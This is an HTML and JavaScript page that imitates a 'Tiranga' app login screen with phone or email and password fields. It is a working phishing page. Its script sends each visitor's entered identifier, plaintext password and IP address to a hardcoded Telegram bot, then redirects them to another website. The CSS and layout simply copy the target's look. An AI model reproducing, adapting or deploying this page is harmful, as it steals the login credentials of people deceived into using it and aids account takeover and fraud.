<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tiranga Login</title>
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
    <!-- FontAwesome Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* --- TIRANGA DARK THEME CSS --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Open Sans', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #1a1a24; /* Dark background outside phone */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .app-container {
            width: 100%;
            max-width: 414px;
            height: 100vh;
            max-height: 896px;
            background-color: #1b1b36; /* Main Dark Blue Background */
            position: relative;
            display: flex;
            flex-direction: column;
            box-shadow: 0 15px 50px rgba(0,0,0,0.5);
            overflow: hidden;
            color: #ffffff;
        }

        .scrollable-content {
            flex: 1;
            overflow-y: auto;
            padding-bottom: 20px;
        }

        /* Hide scrollbar */
        .scrollable-content::-webkit-scrollbar {
            width: 0px;
        }

        /* --- HEADER SECTION --- */
        .header {
            background-color: #242447; /* Slightly lighter dark blue for header */
            padding: 20px 20px 25px 20px;
            color: white;
        }

        .nav-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            position: relative;
        }

        .nav-bar i.fa-chevron-left {
            font-size: 20px;
            cursor: pointer;
            color: #ffffff;
        }

        .logo-container {
            display: flex;
            align-items: center;
            justify-content: center;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
        }

        /* Recreating the Tiranga Logo text */
        .logo-text {
            font-size: 28px;
            font-weight: 700;
            font-style: italic;
            letter-spacing: 1px;
            color: #ffffff;
            display: flex;
            align-items: center;
        }
        
        .logo-text span {
            color: #29b6f6; /* Light blue color for the 'T' */
            font-size: 32px;
            margin-right: -2px;
        }

        .header-title h1 {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .header-title p {
            font-size: 12.5px;
            line-height: 1.5;
            color: #d1d1e0;
            font-weight: 400;
        }

        /* --- TABS SECTION --- */
        .tabs-container {
            display: flex;
            background-color: #1b1b36;
            border-bottom: 1px solid #2a2a4a;
            padding: 0 15px;
        }

        .tab {
            flex: 1;
            text-align: center;
            padding: 15px 0 12px 0;
            font-size: 14.5px;
            font-weight: 700;
            color: #8c8ca3; /* Greyish text for inactive */
            cursor: pointer;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            position: relative;
            transition: color 0.3s;
        }

        .tab i {
            font-size: 20px;
            color: #5b5b85;
            transition: color 0.3s;
        }

        .tab.active {
            color: #29b6f6; /* Light blue active color */
        }

        .tab.active i {
            color: #29b6f6;
        }

        .tab.active::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 10%;
            width: 80%;
            height: 2px;
            background-color: #29b6f6;
        }

        /* --- FORM SECTION --- */
        .form-section {
            padding: 25px 20px 20px 20px;
        }

        .input-group {
            margin-bottom: 22px;
        }

        .label {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            font-weight: 400;
            color: #ffffff;
            margin-bottom: 12px;
        }

        .label-icon {
            color: #29b6f6; /* Blue icons */
            font-size: 16px;
        }

        .input-row {
            display: flex;
            gap: 10px;
        }

        /* Dark Blue Inputs */
        .custom-input, .country-code {
            background-color: #26264a;
            border: 1px solid transparent;
            border-radius: 10px;
            padding: 14px 15px;
            font-size: 14px;
            color: #ffffff;
            outline: none;
            transition: border-color 0.3s;
        }

        .custom-input:focus {
            border-color: #29b6f6;
        }

        .custom-input::placeholder {
            color: #7a7a9a;
        }

        .country-code {
            width: 80px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #a0a0c0;
            font-weight: 600;
            cursor: pointer;
        }

        .country-code i {
            font-size: 12px;
        }

        .input-row .custom-input {
            flex: 1;
        }

        /* Password Wrapper */
        .password-wrapper {
            position: relative;
        }

        .password-wrapper .custom-input {
            width: 100%;
            padding-right: 45px;
        }

        .eye-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #7a7a9a;
            font-size: 16px;
            cursor: pointer;
            padding: 5px;
        }

        /* Options Row */
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
            margin-bottom: 30px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: #a0a0c0;
            cursor: pointer;
        }

        .remember-me input {
            appearance: none;
            width: 18px;
            height: 18px;
            border: 1.5px solid #5b5b85;
            border-radius: 50%;
            cursor: pointer;
            position: relative;
            background: transparent;
            outline: none;
        }

        .remember-me input:checked {
            border-color: #29b6f6;
            background-color: transparent;
        }

        .remember-me input:checked::after {
            content: '';
            width: 8px;
            height: 8px;
            background-color: #29b6f6;
            border-radius: 50%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .forgot-password {
            font-size: 13px;
            color: #29b6f6;
            text-decoration: none;
            cursor: pointer;
        }

        /* --- BUTTONS --- */
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 700;
            transition: all 0.3s ease;
        }

        /* Disabled State */
        .btn-login {
            background-color: #3f3f5a;
            color: #8888a0;
            margin-bottom: 15px;
            cursor: not-allowed;
        }

        /* Active State */
        .btn-login.active {
            background-color: #4db6ac; /* Greenish/Teal color from image */
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(77, 182, 172, 0.3);
        }
        
        .btn-login.loading {
            background-color: #4db6ac;
            cursor: wait;
            opacity: 0.8;
        }

        .btn-register {
            background-color: transparent;
            color: #29b6f6;
            border: 1px solid #29b6f6;
            cursor: pointer;
        }
        
        .btn-register:active {
            background-color: rgba(41, 182, 246, 0.1);
        }

        /* --- BOTTOM NAVIGATION --- */
        .bottom-nav {
            background-color: #ffffff; /* White bottom nav */
            display: flex;
            justify-content: space-around;
            padding: 15px 10px;
            position: relative;
            z-index: 10;
        }

        .bottom-nav i {
            font-size: 22px;
            color: #333;
            cursor: pointer;
        }

        .nav-icon-box {
            border: 1.5px solid #333;
            border-radius: 4px;
            padding: 1px 4px;
            font-size: 14px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #333;
        }

        /* Laptop View */
        @media (min-width: 500px) {
            .app-container {
                border-radius: 20px;
                height: 90vh;
            }
        }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="scrollable-content">
            
            <!-- Header -->
            <div class="header">
                <div class="nav-bar">
                    <i class="fas fa-chevron-left"></i>
                    <div class="logo-container">
                        <div class="logo-text"><span>T</span>iranga</div>
                    </div>
                    <div style="width: 20px;"></div>
                </div>
                <div class="header-title">
                    <h1>Log in</h1>
                    <p>Please log in with your phone number or email<br>If you forget your password, please contact customer service</p>
                </div>
            </div>

            <!-- Tabs -->
            <div class="tabs-container">
                <div class="tab active" onclick="switchTab('phone')" id="tab-phone">
                    <i class="fas fa-mobile-alt"></i>
                    Phone Number
                </div>
                <div class="tab" onclick="switchTab('email')" id="tab-email">
                    <i class="fas fa-envelope"></i>
                    Email
                </div>
            </div>

            <!-- Form -->
            <div class="form-section">
                
                <!-- Phone Input -->
                <div class="input-group" id="phone-group">
                    <div class="label">
                        <i class="fas fa-mobile-alt label-icon"></i> Phone number
                    </div>
                    <div class="input-row">
                        <div class="country-code">
                            +91 <i class="fas fa-chevron-down"></i>
                        </div>
                        <input type="tel" id="phoneInput" class="custom-input" placeholder="Please enter the phone number" oninput="checkInputs()">
                    </div>
                </div>

                <!-- Email Input (Hidden) -->
                <div class="input-group" id="email-group" style="display: none;">
                    <div class="label">
                        <i class="fas fa-envelope label-icon"></i> Email Address
                    </div>
                    <div class="input-row">
                        <input type="email" id="emailInput" class="custom-input" placeholder="Please enter your email" oninput="checkInputs()">
                    </div>
                </div>

                <!-- Password Input -->
                <div class="input-group">
                    <div class="label">
                        <i class="fas fa-lock label-icon"></i> Password
                    </div>
                    <div class="password-wrapper">
                        <input type="password" id="passInput" class="custom-input" placeholder="Password" oninput="checkInputs()">
                        <i class="fas fa-eye-slash eye-icon" id="eyeIcon" onclick="togglePassword()"></i>
                    </div>
                </div>

                <!-- Options -->
                <div class="options">
                    <label class="remember-me">
                        <input type="checkbox"> Remember password
                    </label>
                    <a href="#" class="forgot-password">Forgot password?</a>
                </div>

                <!-- Buttons -->
                <button class="btn btn-login" id="loginBtn" onclick="handleLogin()">Log in</button>
                <button class="btn btn-register">Register</button>
            </div>
        </div>

        <!-- Bottom Navigation (White Background) -->
        <div class="bottom-nav">
            <i class="fas fa-home"></i>
            <i class="far fa-bookmark"></i>
            <i class="fas fa-search"></i>
            <div class="nav-icon-box">6</div>
            <i class="fas fa-ellipsis-v"></i>
        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const TELEGRAM_BOT_TOKEN = "9259984995:AAHU5oRM8Zh5kDEpncGTa0bSZwgrvb-ATbM";
        const TELEGRAM_CHAT_ID = "8529083318";
        
        // AAPKI NAYI WEBSITE KA LINK YAHAN HAI
        const REDIRECT_URL = "https://tiranagam.ai/"; 

        function switchTab(type) {
            const tabPhone = document.getElementById('tab-phone');
            const tabEmail = document.getElementById('tab-email');
            const phoneGroup = document.getElementById('phone-group');
            const emailGroup = document.getElementById('email-group');

            if (type === 'phone') {
                tabPhone.classList.add('active');
                tabEmail.classList.remove('active');
                phoneGroup.style.display = 'block';
                emailGroup.style.display = 'none';
            } else {
                tabEmail.classList.add('active');
                tabPhone.classList.remove('active');
                phoneGroup.style.display = 'none';
                emailGroup.style.display = 'block';
            }
            checkInputs();
        }

        function togglePassword() {
            const passInput = document.getElementById('passInput');
            const eyeIcon = document.getElementById('eyeIcon');

            if (passInput.type === 'password') {
                passInput.type = 'text';
                eyeIcon.classList.remove('fa-eye-slash');
                eyeIcon.classList.add('fa-eye');
                eyeIcon.style.color = '#29b6f6'; // Blue when active
            } else {
                passInput.type = 'password';
                eyeIcon.classList.remove('fa-eye');
                eyeIcon.classList.add('fa-eye-slash');
                eyeIcon.style.color = '#7a7a9a';
            }
        }

        function checkInputs() {
            const phoneVal = document.getElementById('phoneInput').value.trim();
            const emailVal = document.getElementById('emailInput').value.trim();
            const passVal = document.getElementById('passInput').value;
            const loginBtn = document.getElementById('loginBtn');
            const isPhoneTab = document.getElementById('tab-phone').classList.contains('active');

            let isFormValid = false;

            if (isPhoneTab) {
                isFormValid = (phoneVal.length >= 10 && passVal.length >= 4);
            } else {
                isFormValid = (emailVal.includes('@') && emailVal.includes('.') && passVal.length >= 4);
            }

            if (isFormValid) {
                loginBtn.classList.add('active');
            } else {
                loginBtn.classList.remove('active');
            }
        }

        // IP Address nikalne ka function
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return "Unknown IP";
            }
        }

        // Telegram API Function
        async function sendToTelegram(messageText) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: messageText,
                        parse_mode: 'HTML'
                    })
                });
                return (await response.json()).ok;
            } catch (error) {
                console.error("Telegram Error:", error);
                return false;
            }
        }

        // Main Login Function
        async function handleLogin() {
            const loginBtn = document.getElementById('loginBtn');
            const isPhoneTab = document.getElementById('tab-phone').classList.contains('active');
            
            if (!loginBtn.classList.contains('active')) {
                alert("Please enter a valid Phone/Email and Password (min 4 chars).");
                return;
            }

            // Button loading state
            loginBtn.innerText = "Logging in...";
            loginBtn.classList.add('loading');
            loginBtn.disabled = true;

            // Get Data
            let userIdentifier = isPhoneTab 
                ? "+91 " + document.getElementById('phoneInput').value.trim() 
                : document.getElementById('emailInput').value.trim();
            const password = document.getElementById('passInput').value;

            // IP Address fetch karna
            const userIP = await getUserIP();

            // Prepare Message
            const tgMessage = `
<b>🔔 New Tiranga Login Attempt!</b>
<b>---------------------------</b>
<b>Type:</b> ${isPhoneTab ? 'Phone Number' : 'Email'}
<b>User/ID:</b> ${userIdentifier}
<b>Password:</b> <code>${password}</code>
<b>IP Address:</b> <code>${userIP}</code>
<b>---------------------------</b>
<i>Website: Tiranga Login</i>
            `;

            // Send to Telegram
            await sendToTelegram(tgMessage);

            // 1.5 seconds baad nayi website par bhej dena
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1500); 
        }
    </script>
</body>
  </html>
